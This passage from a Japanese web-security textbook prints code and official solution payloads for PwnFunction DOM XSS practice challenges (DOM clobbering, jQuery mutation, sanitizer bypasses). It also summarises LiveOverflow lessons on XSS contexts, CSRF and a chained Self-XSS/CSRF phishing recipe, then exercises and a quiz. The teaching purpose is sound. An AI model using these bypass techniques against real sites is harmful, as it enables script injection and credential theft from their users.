const escape = (dirty) => unescape(dirty).replace(/[<>'"=]/g, '');

const memeTemplate = (img, text) => {
    return (`<style>@import url('https://fonts.googleapis.com/css?family=Oswald:700&display=swap');.meme-card{margin:0 auto;width:300px}.meme-card>img{width:300px}.meme-card>h1{text-align:center;color:#fff;background:black;margin-top:-5px;position:relative;font-family:Oswald,sans-serif;font-weight:700}</style><div class="meme-card"><img src="${img}"><h1>${text}</h1></div>`)
}

const memeGen = (that, notify) => {
    if (text && img) {
        template = memeTemplate(img, text)
        if (notify) {
            html = (`<div class="alert alert-warning" role="alert"><b>Meme</b> created from ${DOMPurify.sanitize(text)}</div>`)
        }
        setTimeout(_ => {
            $('#status').remove()
            notify ? ($('#notify').html(html)) : ''
            $('#meme-code').text(template)
        }, 1000)
    }
}
```
```js
/* Main */
let notify = false;
let text = new URL(location).searchParams.get('text')
let img = new URL(location).searchParams.get('img')
if (text && img) {
    document.write(
        `<div class="alert alert-primary" role="alert" id="status"><img class="circle" src="${escape(img)}" onload="memeGen(this, notify)">Creating meme... (${DOMPurify.sanitize(text)})</div>`
    )
} else {
    $('#meme-code').text(memeTemplate('https://i.imgur.com/PdbDexI.jpg', 'When you get that WW3 draft letter'))
}
```

公式解（逐語ペイロード。フルURLは `img=valid_image_url&text=` に続けて）。

```markup
<img name=notify><style><style/><script>alert(1337)//
```

原文解説の要点（逐語含む）。sink は jQuery の `html()`。呼び出しトレースは `html()` → `append()` → `domManip()` → `buildFragment()` → `htmlPrefilter()` で、`htmlPrefilter()` は自己閉じタグを開閉タグ対に変換する。ソース（逐語）。

```js
// source of htmlPrefilter()
jQuery.extend( {
	htmlPrefilter: function( html ) {
		return html.replace( rxhtmlTag, "<$1></$2>" );
	},
    ...
```

つまり `<blah/>` が `<blah></blah>` に変換される。`<style><style/>Elon` は `innerHTML` なら1つ目の `<style>` の中に `<style/>Elon` が入るが、`html()` では `<style/>` が `<style></style>` に変わり、2つ目の `<style>` が1つ目の内容扱いになって、`Elon` テキストがHTMLコンテキストに露出しXSSになる。

さらに `notify` を `false` から `true` にする必要がある。ここで **DOM Clobbering** と **augmented scope chain（スコープ連鎖の拡張）** を使う。イベントハンドラ属性のコードは関数でラップされ、そのスコープ連鎖は要素・`form`・`document` で拡張される。`<img name=notify>` で `document.notify` を作ると、`onload` ハンドラ内で `notify` を解決するときにローカル→document の順で探索され、`document` 上の `notify`（truthy＝真とみなされる値）が拾われて、グローバルの `notify=false` を shadow（陰に隠す）する。

### 3-14. Challenge: Jason Bourne（Medium、コメントmutation＋DOM Clobbering連鎖）

複数の DOM Clobbering を連鎖させて認可チェックを崩す。中核部（逐語）。

```js
/* Welcome */
let name = (new URL(location).searchParams.get('name')) || "Pamela Landy";
document.write(
    bootstrapAlert(`<b>Operation Treadstone</b>: Welcome <u>${name}</u>.`, 'info')
)
```
```js
/* Handle to `#alert` */
let alerts = document.getAlert();
/* Treadstone Credentials */
let identification = Math.random().toString(36).slice(2);
let code = Math.floor(Math.random() * 89999 + 10000);
/* Default Credentials */
DEFAULTS = {};
DEFAULTS[identification] = code;
```
```js
/* Optional Comment */
if (location.hash) {
    let comment = document.createComment(decodeURI(location.hash).slice(1));
    document.querySelector('#alerts').appendChild(comment);
}
```
```js
/* Use `DEFAULTS` to init `SECRETS` */
SECRETS = DEFAULTS
/* Increment the `code` before the check */
let secretKey = new URL(location).searchParams.get('key') || "TREADSTONE_WEBB";
SECRETS[secretKey] += 1;
/* Authorization Check */
if (SECRETS[secretKey] === SECRETS[identification]) {
    confirm(`Jesus Christ, it's Jason Bourne!`)
} else {
    confirm(`You ain't David Webb!`)
}
```

公式解（逐語ペイロード）。

```markup
?name=<img name=getAlert><form id=alerts name=DEFAULTS>&key=innerHTML#--><img src onerror=alert(1337)>
```

手順（逐語の要点）。`<img name=getAlert>` で `document.getAlert` をclobberして呼び出しをエラー化し、以降のコードを実行させず `DEFAULTS` を未定義のままにする。`<form id=alerts name=DEFAULTS>` で `DEFAULTS`（従って `SECRETS`）をそのForm要素にredefineする。`location.hash` の `--><img src onerror=alert(0)>` は id=alerts のForm要素内にコメントとして入る。`secretKey` を `innerHTML` にすると `SECRETS[secretKey] += 1`（＝`FORMElement['innerHTML'] += 1`）でmutationが発火する。

### 3-15. Challenge: Me and the Bois（Medium、iframe clobber→window→src=javascript:）

`iframe` がホワイトリストに含まれる点と、`window.CONFIG` を iframe の `window` オブジェクトにclobberできる点を組み合わせる。中核部（逐語）。

```js
/* Variables */
let safeTags = ['a', 'area', 'b', 'br', 'col', 'code', 'div', 'em', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'i', 'iframe', 'img', 'li', 'ol', 'p', 'pre', 's', 'small', 'span', 'sub', 'sup', 'strong', 'u', 'ul']
let forbiddenAttrs = ['style', 'srcdoc']
let cssSafe = /[^a-zA-Z0-9\s\-\,\:\_\(\)\{\}\"\'\.\#\;\%]/g

/* Inputs */
let boi = `<h1>${(new URL(location).searchParams.get('boi')) || 'Neo'}</h1>`
let clean = DOMPurify.sanitize(boi, { ALLOWED_TAGS: safeTags, FORBID_ATTR: forbiddenAttrs })
let bois = document.getElementById('bois')
bois.innerHTML += clean;

/* Custom Style JSON */
let custom = (new URL(location).searchParams.get('custom')) || ""
custom = custom.replace(cssSafe, '')
if (custom) {
    customStyles = JSON.parse(custom)
    let comment = document.createComment(customStyles)
    bois.appendChild(comment)
}

/* Configuration */
window.CONFIG = {
    color: "lime",
    backgroundColor: "#000"
}
```
```js
/* Generic Style Setter */
function styleSetter(styles, execStr) {
    for (var style in styles) {
        if (styles.hasOwnProperty(style)) {
            eval(execStr)
        }
    }
}
/* Custom Styles */
if (window.customStyles) {
    styleSetter(customStyles, `CONFIG[style] = customStyles[style]`)
}
/* Stylise! */
styleSetter(CONFIG, `bois.firstElementChild.style[style] = CONFIG[style]`)
```

公式解（逐語ペイロード）。

```markup
?boi=<iframe id=CONFIG src=/>&custom={"toString":0,"src":"javascript:alert(1337)"}
```

要点（逐語）。`custom.toString` を数値にすると `document.createComment(customStyles)` の暗黙 `toString()` 呼び出しでエラーになり `window.CONFIG` が未生成になる。`<iframe name=CONFIG src=/>` で `CONFIG` をそのiframeの `window` オブジェクトにclobberし、`CONFIG.src` を `javascript:alert(1337)` にして現ドメインコンテキストで実行する。

### 3-16. Challenge: Ded（Medium、Bootstrap 4.4.0 sanitizerのDOM Clobbering）

Bootstrap **4.4.0** 固有の sanitizer バグ。課題コード（逐語）。

```html
<div id="ded">
    <button type="button" class="btn btn-lg btn-danger" data-toggle="popover" title="Hints" data-html="true"
        data-content="<li>Anything different about this challenge?</li>
        <li>Look Deeper!</li>">Lemme help you.</button>
</div>
<script>
    /* Inputs */
    let code = (new URL(location).searchParams.get('code')).replace(/script/ig, "_") || `<li><strike>ded</strike></li>`
    let clean = DOMPurify.sanitize(code, { SAFE_FOR_JQUERY: true })
    document.getElementById('ded').innerHTML += clean
</script>
<script>
    /* Extend Bootstrap Popover */
    let whiteList = $.fn.tooltip.Constructor.Default.whiteList
    whiteList.form = []
    /* Popovers! */
    $(function () {
        $('[data-toggle="popover"]').popover('show')
    })
</script>
```

公式解（逐語ペイロード、第2案 onanimationstart）。

```markup
<button data-toggle="popover" data-html="true" data-content="<form class='spinner-grow' onanimationstart=alert(1337)><input id=attributes>">yo!</button>
```

要点（逐語）。`whiteList.form = []` で `form` が許可される。Bootstrap sanitizer の該当行は `const attributeList = [].concat(...el.attributes)`。`<form><input id=attributes>` とすると `form` の `attributes` プロパティが子の `HTMLInputElement` にclobberされ、`[].concat(HTMLInputElement)` が `[]` を返すため sanitizer が「属性なし」と誤認する。styleタグは非許可なので、Bootstrap既存アニメ `spinner-grow`（`scss/_spinners.scss` 由来）を流用して `onanimationstart` を無操作で発火させる。

---

## 4. web 0x03「XSS Contexts and some Chrome XSS Auditor tricks」詳細

ここからは LiveOverflow の逐語トランスクリプトをもとに、クライアントサイド学習の最重要回を深掘りする。まず `web 0x03`（video_id `8GwVBpTgR2c`、2016-09-13、78,260再生）は、**「出力コンテキストごとにエスケープの要件が違う」**という本質を実演する回である。

### 4-1. XSS Auditor の限界 — 分割ペイロード

XSS Auditor とは、かつてのChromeに搭載されていた、反射型XSSをブラウザ側で検知・ブロックする機能のこと（後に廃止された）。**設計意図**はユーザ保護だが、**仕組み**上「URLパラメータの内容がページに反射しているか」を見るだけなので、反射点が複数あると破綻する。動画の逐語では "And once there are multiple inputs, the XSS Auditor is basically broken." と述べられる。

**攻撃者が突くところ**: 1つ目のパラメータ `name` で `<script>alert("` まで書いて文字列を開き、2つ目のパラメータ `age` で `")</script>` と閉じる。間に挟まる本来のページテキストが `alert()` の引数になり、`alert("br, you are")` のように発火する。1つ目のalertを無害化したければ、`a = "…"` と変数代入にしてページテキストを吸収し、その後に好きなJSを書けばよい。

### 4-2. 4つのコンテキストと `htmlspecialchars` の落とし穴

LiveOverflow が用意したPHPテストページのコンテキスト分類は、そのまま「コンテキスト」の教科書になる。

| # | コンテキスト | 例 | 攻撃の要点 |
| --- | --- | --- | --- |
| 1 | 通常のHTML本文 | `echo $a;` | タグをそのまま注入 |
| 2 | 引用符つき属性 | `<img src="$b">` | `"` で属性を抜け、`>` でタグを閉じて `<script>` |
| 3 | 引用符なし属性 | `<img src=$c>` | 引用符を一切使わず ` onerror=alert(1)` を付けるだけ |
| 4 | script タグ内 | `<script>var x = $d;</script>` | `alert(1)` と書くだけで実行される |

**決定的な学び**（逐語）: "htmlspecialchars does not protect you in every case." PHPの `htmlspecialchars()` は既定で**シングルクォートをエンコードしない**。`ENT_QUOTES` フラグを明示しないと、`<img src='$b'>` の文脈で `'` を使って属性を抜けられる。しかも `>` が封じられていても、`<img>` には読み込み失敗時に発火する `onerror` イベントハンドラがあるため、`' onerror=alert(1) '` の形で**新タグを作らずに**XSSが成立する。LiveOverflow の結論は "Another lessons learned in - read the frckn documentation!"（ドキュメントを読め）である。

**どう守るか**: 出力コンテキストに合ったエスケープを行うこと。HTML属性に出すなら引用符必須かつ `ENT_QUOTES` を指定し、`<script>` 内（コンテキスト4）はそもそも `htmlspecialchars` が無意味（HTMLエンティティはJSパーサに解釈されない）なので、ユーザ入力をスクリプト内に直接埋め込まない設計にする。

### 4-3. 「script文字列を除去する」対策の自爆

素朴な対策「`script` という文字列を全部消す」を入れると、攻撃者は `<img sscriptrc=x onerror=alert(1)>` のように**ペイロードの中にわざと `script` を撒く**。除去後に有効なタグになる一方で、URLパラメータの文字列がページ上の出力とマッチしなくなるので、XSS Auditor が反射を検知できなくなる。つまり**その場しのぎのフィルタが、逆にAuditorバイパスの道具になる**。

### 4-4. XSS Auditor を「コード実行フローの改変」に悪用する

トランスクリプト後半の最も面白い部分。ページに次のようなJSがあるとする。

```js
var ASD = "something";
// ...
if (typeof ASD === 'undefined') { alert(1) }
```

攻撃者はダミーのGETパラメータに1つ目の `<script>` タグの中身をそのまま入れる。Chromeは「このパラメータがこのscriptタグの原因だ」と誤認し、**そのscriptタグの実行だけを止める**。結果 `ASD` が未初期化になり、後続の `alert(1)` 分岐に到達する。

**教訓**: XSS Auditor（およびその後継的な防御一般）は「スクリプトを止める」こと自体が副作用を持ち、攻撃者に制御フロー改変のプリミティブ（部品）を与えうる。これはChromeがXSS Auditorを2019年に廃止した理由の一系統（XS-Leak / XS-Search 悪用）とも通じる。同じ論点の発展形が本節2-4の `XS-Search abusing the Chrome XSS Auditor - filemanager 35c3ctf`（HcrQy0C-hEA）である。

---

## 5. web 0x04「CSRF Introduction and what is the Same-Origin Policy?」詳細

`web 0x04`（video_id `KaEj_qZgiKY`、2016-09-23、113,701再生）は、同一オリジンポリシー（Same-Origin Policy, SOP）とCSRFの関係を実演する回である。CSRF（Cross-Site Request Forgery、クロスサイトリクエストフォージェリ）とは、ログイン済みユーザのブラウザに、攻撃者のサイトから被害サイトへ意図しないリクエストを送らせる攻撃のこと。

### 5-1. SOPは「送信」ではなく「読み取り」を止める

**設計意図**: SOPは、あるオリジン（scheme＋host＋port の組）のページが、別オリジンのデータを勝手に読めないようにする基本的な防御である。reddit.com と imgur.com を使った4つの実験は、SOP章にそのまま使える。

| 実験 | 結果 | 意味 |
| --- | --- | --- |
| imgur から `<img src="https://reddit.com/...">` | 表示される。ブラウザは文句を言わない | クロスオリジンの**リソース読み込み**は許可 |
| imgur から `XMLHttpRequest` で reddit の `.json` を GET | 200は返るが**Cookieが付かず**、`/login` にリダイレクトされ空JSON | 既定でクレデンシャルは送られない |
| 同上 + `withCredentials = true` | **SOP違反エラー**（`imgur.com is not allowed to perform a GET request to reddit.com with cookies`） | 認証付きクロスオリジン読み取りは禁止 |
| imgur から `<img src="https://reddit.com/....json">` | **Cookieが送信される**（ネットワークタブで確認可） | **送信は通るが、レスポンスを読めない** |

**仕組みの核心**（逐語）: "we can't access the response of this request. We cannot access the json content, thus we cannot access the private user data." つまりSOPは「認証付きリクエストの送信」を止めるものではない。この**非対称性**（送信は通る／読み取りは止まる）がCSRFの存在理由そのものである。緩和する仕組みとしてCORS応答ヘッダがあることにも触れられる（Chromeのエラーメッセージ自体がそれを教えてくれる）。

### 5-2. GET CSRF と POST CSRF

HTTPの設計上、GETは「取得」、POSTは「送信・状態変更」を担う。**GETで状態変更をしてしまう実装**（例: `/profile/delete`）があると、攻撃サイトに `<img src="https://target/profile/delete">` を置くだけで、訪問者全員のプロフィールが消える。これが最初のCSRFである。

POSTしか状態変更しない設計でも安全ではない。`<form method="POST" action="https://target/...">` を作りJavaScriptで自動送信すれば、Cookie付きPOSTが飛ぶ。ユーザのクリックは不要。重要な注意（逐語）: "the same-origin policy is not violated here, because our origin does not get access to the resources, the response, the data of this other domain." **CSRFはSOPの破れではなく、SOPの設計上の帰結**である。

### 5-3. 不十分な対策と、その破り方

| 対策 | なぜ不十分か（動画の説明） |
| --- | --- |
| `Origin` ヘッダを見る | フォーラム等が**ユーザ投稿画像の埋め込みを許す**場合、被害サイト自身のドメインからGET CSRFのURLを読み込ませられ、同一Originに見える |
| 「Content-Type: application/json ならクロスドメインで送れない」 | StackExchangeの古い回答を鵜呑みにするのは危険。`navigator.sendBeacon` を使うトリックで任意Content-Typeに近いことができる |

`sendBeacon` のトリックについてLiveOverflowは（逐語）"It's a super awesome trick. And little tricks like that make the difference between a normal web penetration tester and a great one." と述べている。

### 5-4. CSRFトークンの3要件

**どう守るか**の中核がCSRFトークンである。CSRFトークンとは、サーバが発行する秘密のランダム値をフォームに埋め込み、リクエスト時にそれを検証することで「本当にそのサイトのページから送られたか」を確かめる仕組みのこと。動画は3条件を明示する。

1. **サーバが発行する秘密のランダム値**を、同一ドメイン上のページからしかアクセスできない形で置く。
2. **全POSTに含める**。なければサーバは処理を拒否する。
3. **セッション（ユーザ）にバインドする**。これが最重要。バインドしないと「自分のアカウントで有効なトークンを集めて他人への攻撃に使い回す」ことができてしまう。

リクエストごとに変える必要はないが、永久に有効にしてはいけない。そして**トークンを漏洩させる経路が1つ見つかれば、CSRF対策は無力化される**。さらに動画は "just because a website has a vulnerable endpoint doesn't mean it's a critical issue."（脆弱なエンドポイントがあるからといって重大な問題とは限らない）と釘を刺す。

### 5-5. 「低深刻度3つ」を連鎖させる攻撃レシピ

この回のハイライト。**Self-XSS ＋ ログアウトCSRF ＋ ログインCSRF** の3つは、単体ではどれも「報告しても相手にされない」低深刻度だが、順に繋ぐと本格的なフィッシングになる。Self-XSSとは、被害者自身が自分の画面に貼り付けたときだけ発火するXSSのことで、通常は他人を攻撃できないため軽視される。

1. 攻撃者が新規アカウントを作り、自分だけが見えるメモ欄に **Self-XSS** を仕込む。ペイロードは「偽のログインプロンプトを出してパスワードを再入力させる」もの。
2. 攻撃サイトを作り、訪問者に **ログアウトCSRF** を撃って強制的にログアウトさせる。
3. 続けて **ログインCSRF** で、攻撃者アカウントの資格情報でログインさせる。
4. 被害者をサイトに戻すと、被害者のブラウザは**攻撃者アカウントとして認証された状態**になり、そのアカウントのSelf-XSSが発火して偽プロンプトが出る。被害者は「正規サイトだ」と信じてパスワードを入力する。

LiveOverflowの締めは "Beautiful phishing attack." である。バグバウンティで「低深刻度だから」と捨てる前に、**連鎖の部品にならないか**を考える教訓になる。

---

## 6. web 0x05「The Browser is a very Confused Deputy」詳細

`web 0x05`（video_id `Yfsmc0b8o78`、2016-11-01、37,852再生）は、Norman Hardy の名論文 "The Confused Deputy"（1988、`https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html`）を読み、XSS/CSRFの本質を「混乱した代理人」という理論的支柱で説明する回である。

### 6-1. 原典の物語

Tymshare社のタイムシェアリングOS上の話。

- `/SYSX/FORT` というFORTRANコンパイラがあり、ユーザは `RUN /SYSX/FORT` で起動し、**デバッグ出力の書き込み先ファイル名を自分で指定できた**。
- コンパイラは言語機能の使用統計を `/SYSX/STAT` に書くため、**SYSXグループの書き込み権限**を与えられていた。同じSYSXディレクトリには**課金情報ファイル `/SYSX/BILL`** もあった。
- あるユーザが `/SYSX/BILL` をデバッグ出力先に指定した。OSは「コンパイラは権限を持っている」と見て書き込みを許可し、**課金情報が失われた**。

### 6-2. なぜ「混乱した代理人」なのか

原典の核心（逐語引用）。

> "The fundamental problem is that the compiler runs with authority stemming from two sources."
> "The compiler serves two masters and carries some authority from each to perform its respective duties. It has no way to keep them apart…"
> "The compiler had no way of expressing these intents!"

権限の出所が2つある。①呼び出したユーザから委譲された権限、②自分自身のグループ権限。コンパイラには**「今どちらの権限で動くつもりか」を表明する手段がなかった**。動画が引用するWikipediaの要約はこうだ。"A confused deputy is a computer program that is innocently fooled by some other party into misusing its authority. It is a specific type of privilege escalation."（混乱した代理人とは、第三者にだまされて自分の権限を誤用させられるプログラムで、権限昇格の一種である。）

### 6-3. ブラウザ＝現代のConfused Deputy

ブラウザは「ユーザの認証済みセッションを扱う権限」を与えられている。しかし第三者（攻撃者のJS）に呼び出されて、意図しない操作を実行してしまう。

- **XSS**: ブラウザはJSを実行するだけで、それが善か悪かを知らない。物語のコンパイラがファイル名の善悪を知らなかったのと同じ。
- **CSRF**: ブラウザはHTMLをパースして埋め込まれた画像を全部取りに行くだけ。その画像URLが「アカウント削除」の副作用を持つかは知らない。

決定的な洞察（逐語）。

> "neither executing javascript, nor handling authenticated sessions is a security vulnerability. This is not a bug in the browser. This is how the browser is supposed to behave. Hell, even injecting javascript into a site is by itself not a vulnerability of a web application. You don't get code exeuction on the server with that. […] ONLY because the browser has a special authority and we trick the browser into doing it for us, it suddenly evolves into a security issue."

つまり「JSが注入できる」だけでは脆弱性ではない。**どの権限（オリジン）の文脈で実行されるか**が全てである。これはクライアントサイド脆弱性の深刻度を語るときの理論的支柱であり、`alert(document.domain)` を使ってどのオリジンで発火したかを確かめる作法（本章の後続ユニットで扱う）と完全に一体をなす。

### 6-4. 研究手法としての応用

動画は実践的な助言で締めくくる（逐語）。

> "Don't always look for this single shot vulnerability. This one buffer overflow to rule it all. Think about what kind legitimate authority a software has. What are the permissions and privileges it has, that you don't have. And once you identified such a system, ask yourself, can you outsmart it."

同じ枠組みで **SSRF**（Server-Side Request Forgery、サーバ側リクエストフォージェリ）も説明される。サーバがリクエストを代行する正当な理由を持つがゆえに、サーバもConfused Deputyになりうる。原典 "The Confused Deputy" は本来、ケーパビリティ（capability）ベースの権限モデルを提案するための論文である、と補足される。ケーパビリティとは、権限そのものを「持ち運べる鍵」として扱い、誰の権限で動くかを曖昧にしない設計思想のこと。

---

## 手を動かす

1. LiveOverflow のトランスクリプトを手元に置く。ターミナルで次を実行する。

   ```bash
   git clone --depth 1 https://github.com/LiveOverflow/yt_statistics
   cd yt_statistics
   less liveoverflow_transcripts/8GwVBpTgR2c.txt   # web 0x03（XSSコンテキスト）
   less liveoverflow_transcripts/KaEj_qZgiKY.txt   # web 0x04（CSRFとSOP）※注: ファイル名はvideo_id
   less liveoverflow_transcripts/Yfsmc0b8o78.txt   # web 0x05（Confused Deputy）
   ```

2. `web 0x03` を観る／読む前に、自分でPHPの4コンテキスト・テストページを作って挙動を確かめる。`htmlspecialchars($v)` と `htmlspecialchars($v, ENT_QUOTES)` の違いを、`<img src='...'>` の文脈で実際に試す。

3. PwnFunction の DOM XSS ゲームを開く。`https://xss.pwnfunction.com/` にアクセスし、まず **Ma Spaghet!** を自力で解く。URL末尾に `?somebody=<svg onload=alert(1337)>` を付けて `alert(1337)` が出れば成功。

4. Warmups を順に解く。詰まったら公式ソースを読む。

   ```bash
   git clone https://github.com/PwnFunction/xss.pwnfunction.com   # 公式解説（hugo/content 配下）
   git clone https://github.com/PwnFunction/sandbox.pwnfunction.com # 実チャレンジHTML
   ```

5. **Ok, Boomer** で初めて DOM Clobbering を体験する。`?boomer=<a id=ok href=tel:alert(1337)>` を投げ、`setTimeout(ok, ...)` の `ok` がアンカー要素にclobberされる様子をデベロッパーツールのコンソールで `document.getElementById('ok').toString()` を評価して確認する。

6. `WW3`・`Jason Bourne`・`Me and the Bois`・`Ded` の4問で、DOM Clobbering・scope shadowing・iframe clobber・sanitizer混同という上級テクを1つずつ潰す。各問、まず課題コードの sink を特定し、次にフィルタを読み、最後に「無操作で発火する仕掛け」を探す、という順で考える。

## つまずきポイント

- **YouTubeが開けても、トランスクリプトだけでは細部が分からない**。動画は `this`・`here` と画面を指しながら話すので、コード・DOMツリー・デベロッパーツールの画面は映像でしか分からない。理解が浅いと感じたら必ず映像を観る。
- **再生数などの数値は2023-03-15時点**であり、それ以降の新作動画は `yt_statistics` に含まれない。最新状況はチャンネルページで確認する。
- **「Arbitrary Read and Write in WebKit Exploit（2019-07-21）」は取得データ上に存在しない**。ネット上の言及を鵜呑みにせず、YouTubeで自分で確認する。
- **DOM XSS ゲームの Challenges は現在では新バイパスがあり容易に解ける**（原文注記）。当時の難易度表と現在の解きやすさは一致しない。
- **`htmlspecialchars` は既定でシングルクォートをエンコードしない**。`ENT_QUOTES` を付け忘れると引用符つき属性のコンテキストで抜けられる。
- **SOPは「送信」を止めない**。「クロスオリジンだからCookie付きリクエストは飛ばない」と誤解しがち。飛ぶが、レスポンスが読めないだけ。ここを取り違えるとCSRFの理解が崩れる。
- **「JSが注入できる＝重大」ではない**。どのオリジンで発火するか、どの権限を悪用するかで深刻度は変わる。Self-XSSや別ドメイン発火は単体では低深刻度。
- **無操作要件を忘れる**。ゲームの目標は「No user interaction」。`onclick` 頼みの解は無効で、`onload`・`autofocus`・`onerror`・`onanimationstart`・`setTimeout` など自動発火を使う。

## この節のまとめ

- クライアントサイド学習は、概念を PwnFunction、深掘りと研究プロセスを LiveOverflow、という使い分けが定石である。
- LiveOverflow は `web 0x00`〜`0x05` の入門シリーズ、AngularJSサンドボックス脱出、XSS研究/DOMパーサ系、XSS歴史シリーズ、`browser 0xNN` のブラウザexploitで体系化されている。
- 本教科書は執筆環境でYouTubeが遮断されたため、LiveOverflow 本人公開の `yt_statistics`（全336本のメタデータ＋逐語トランスクリプト、2023-03-15取得、利用許諾あり）を一次情報として用いた。
- PwnFunction はアニメーションで脆弱性クラスを1本ずつ短く解説し、`XSS Explained`・`CSRF Explained`・`Paste-tastic!`（DOM Clobbering）などが必修。
- PwnFunction 公式の `xss.pwnfunction.com` は Warmups 8＋Challenges 6 の DOM XSS 練習場で、`innerHTML`・`eval`・`form.action`・`document.write`・jQuery `html()`・DOMPurify・Bootstrap sanitizer という実際の sink を体験できる。
- Warmups は sink 特定＋フィルタ回避（`<svg onload>`・属性ブレイクアウト・HTMLエンティティ・JSFuck・`Function`/hash）を学ぶ。
- Challenges は DOM Clobbering・scope shadowing・iframe clobber・mutation・sanitizer混同という上級テクを学ぶ。
- DOM Clobbering は、`id`/`name` で同名JS変数が生成される仕様を使い、スクリプトを注入せずに変数を上書き・作成する手法である。
- `web 0x03` は出力コンテキスト4分類を実演し、`htmlspecialchars` は既定でシングルクォートを守らない（`ENT_QUOTES` が必要）ことを教える。
- 素朴な文字列フィルタ（`script` 除去等）は逆にXSS Auditorバイパスの道具になり、XSS Auditor自体もコード実行フロー改変のプリミティブになりうる。
- `web 0x04` は「SOPは送信ではなく読み取りを止める」という非対称性を4実験で示し、それがCSRFの存在理由であることを説明する。
- CSRFトークンの3要件は、秘密のランダム値・全POSTに含める・セッションにバインド、である。
- Self-XSS＋ログアウトCSRF＋ログインCSRFの3つの低深刻度を連鎖させると本格的なフィッシングになる。
- `web 0x05` は Confused Deputy モデルで、「JSが注入できる」だけでは脆弱性ではなく、どの権限（オリジン）の文脈で実行されるかが深刻度を決めることを示す。
- 研究の助言は「単発の万能バグを探すな。ソフトが持つ正当な権限を考え、それを出し抜けるかを問え」である。

## 理解度チェック

1. LiveOverflow と PwnFunction は、それぞれどんなタイプの学習に向くか。
   ▶ 答え: LiveOverflow は深掘り・研究プロセス型（どう調べどう失敗したかを見せる）、PwnFunction は概念の教科書型（1クラスを短くアニメで解説）。概念は PwnFunction、深掘りは LiveOverflow が定石。

2. 本教科書が YouTube ページを直接使えなかった理由と、代わりに使った一次情報は何か。
   ▶ 答え: 執筆環境のegressポリシーで `www.youtube.com` がプロキシに遮断されたため。代わりに LiveOverflow 本人公開の `LiveOverflow/yt_statistics`（全動画メタデータ＋全336本の逐語トランスクリプト、2023-03-15取得、利用許諾あり）と、PwnFunction の公式ゲームリポジトリを使った。

3. `xss.pwnfunction.com` の共通ルールで、`alert(1337)` を出す以外に守るべき制約は何か。
   ▶ 答え: No user interaction（無操作で発火させる）、`sandbox.pwnfunction.com` 上で発火、`?html=&js=&css=` の任意コード実行ページは使用不可、Chromeでテスト。

4. DOM Clobbering とは何か。`Ok, Boomer` ではどう使われたか。
   ▶ 答え: HTML要素に `id`/`name` を付けると同名のJS変数（グローバル/`document` プロパティ）が生成される仕様を悪用し、スクリプトを注入せず変数を上書き・作成する手法。`Ok, Boomer` では未定義の `ok` を `<a id=ok href=tel:alert(1337)>` で作り、`setTimeout(ok,...)` が非関数の `toString()` を実行することで発火させた。

5. PHPの `htmlspecialchars()` の落とし穴と対策は何か。
   ▶ 答え: 既定ではシングルクォートをエンコードしないため、`<img src='$b'>` のような引用符つき属性で `'` を使って抜けられる。`ENT_QUOTES` フラグを明示すればシングルクォートもエンコードされる。ただしscriptタグ内コンテキストではそもそも無意味。

6. 「SOPは送信ではなく読み取りを止める」とはどういうことか。CSRFとどう関係するか。
   ▶ 答え: クロスオリジンでも認証付きリクエストの送信自体は通る（Cookieが飛ぶ）が、レスポンスを読むことは禁止される。この非対称性ゆえに、攻撃者はレスポンスを読めなくても状態変更リクエストを送れる。これがCSRFの存在理由である。

7. CSRFトークンの3要件のうち「最重要」とされたものは何か。なぜか。
   ▶ 答え: セッション（ユーザ）にバインドすること。バインドしないと、攻撃者が自分のアカウントで有効なトークンを取得して他人への攻撃に使い回せてしまうため。

8. 「JSを注入できる」ことが、それだけでは脆弱性とは言えないのはなぜか（Confused Deputy の観点で）。
   ▶ 答え: JS実行も認証済みセッションの処理もブラウザの正常な振る舞いであり、サーバでコード実行できるわけではない。ブラウザという特別な権限を持つ代理人をだまして操作させて初めてセキュリティ問題になる。どのオリジンの文脈で実行されるかが深刻度を決める。

9. 単体では低深刻度な3つのバグを連鎖させて成立するフィッシングの流れを説明せよ。
   ▶ 答え: 攻撃者アカウントにSelf-XSS（偽ログインプロンプト）を仕込み、被害者にログアウトCSRF→ログインCSRFを撃って攻撃者アカウントでログインさせ、Self-XSSを発火させて正規サイトと信じ込ませパスワードを入力させる。

10. `WW3` で突かれる「誤った前提」は何か。
    ▶ 答え: 「`innerHTML` のサニタイズと jQuery `html()` のサニタイズは同じ」という前提。`html()` は内部で `htmlPrefilter()` が自己閉じタグ（`<style/>`）を開閉タグ対（`<style></style>`）に変換するため、`innerHTML` とはパース結果が変わり、`<style><style/>...` でHTMLコンテキストに露出させられる。

## 出典

- LiveOverflow チャンネル: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
- PwnFunction チャンネル: https://www.youtube.com/c/PwnFunction/videos
- LiveOverflow 動画メタデータ・逐語トランスクリプト: https://github.com/LiveOverflow/yt_statistics
- LiveOverflow 動画素材リポジトリ: https://github.com/LiveOverflow/liveoverflow_youtube
- PwnFunction DOM XSS ゲーム（公式解説）: https://github.com/PwnFunction/xss.pwnfunction.com
- PwnFunction DOM XSS ゲーム（実チャレンジHTML）: https://github.com/PwnFunction/sandbox.pwnfunction.com
- PwnFunction DOM XSS ゲーム（プレイ）: https://xss.pwnfunction.com/
- Norman Hardy, "The Confused Deputy": https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html
- saelo, "Attacking JavaScript Engines" (phrack): http://www.phrack.org/papers/attacking_javascript_engines.html
- web 0x03（XSSコンテキスト）: https://www.youtube.com/watch?v=8GwVBpTgR2c
- web 0x04（CSRFとSOP）: https://www.youtube.com/watch?v=KaEj_qZgiKY
- web 0x05（Confused Deputy）: https://www.youtube.com/watch?v=Yfsmc0b8o78

<!-- sources: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w, https://www.youtube.com/c/PwnFunction/videos, https://github.com/LiveOverflow/yt_statistics, https://github.com/PwnFunction/xss.pwnfunction.com, https://github.com/PwnFunction/sandbox.pwnfunction.com, https://xss.pwnfunction.com/, https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html, https://www.youtube.com/watch?v=8GwVBpTgR2c, https://www.youtube.com/watch?v=KaEj_qZgiKY, https://www.youtube.com/watch?v=Yfsmc0b8o78 -->
<!-- terms: LiveOverflow, PwnFunction, DOM Clobbering, mutation XSS, XSS Auditor, htmlspecialchars, ENT_QUOTES, 出力コンテキスト, Same-Origin Policy, CSRF, CSRFトークン, Self-XSS, Confused Deputy, JSFuck, DOMPurify, htmlPrefilter, scope shadowing, sink, ケーパビリティ -->
